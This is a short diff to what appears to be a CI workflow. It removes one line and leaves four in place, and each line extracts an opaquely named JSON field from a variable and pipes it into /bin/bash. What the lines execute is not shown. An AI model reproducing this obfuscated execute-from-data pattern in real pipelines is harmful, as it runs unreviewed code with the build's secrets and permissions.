@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$b79" | jq -r .u2088 | /bin/bash
           echo $v66822 | jq -r .qpq3735 | /bin/bash
           printf '%s' "$q0895" | jq -r .zi17 | /bin/bash
-          echo $age114 | jq -r .tkh83703 | /bin/bash
           printf '%s' "$i93" | jq -r .m13 | /bin/bash
 
       - name: Persist data
